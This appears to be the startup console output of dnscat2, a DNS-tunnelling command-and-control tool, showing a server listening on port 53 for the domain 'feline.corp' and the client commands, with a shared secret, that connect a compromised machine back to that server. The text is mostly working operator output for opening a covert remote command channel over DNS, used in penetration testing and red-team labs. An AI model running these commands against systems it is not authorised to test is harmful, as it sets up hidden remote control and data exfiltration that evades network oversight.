Welcome to dnscat2! Some documentation may be out of date.

Starting Dnscat2 DNS server on 0.0.0.0:53
[domains = feline.corp]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=7a87a5d0a8480b080896606df6b63944 feline.corp

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=7a87a5d0a8480b080896606df6b63944

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.

'ping'! For a full list of clients, try 'help'.
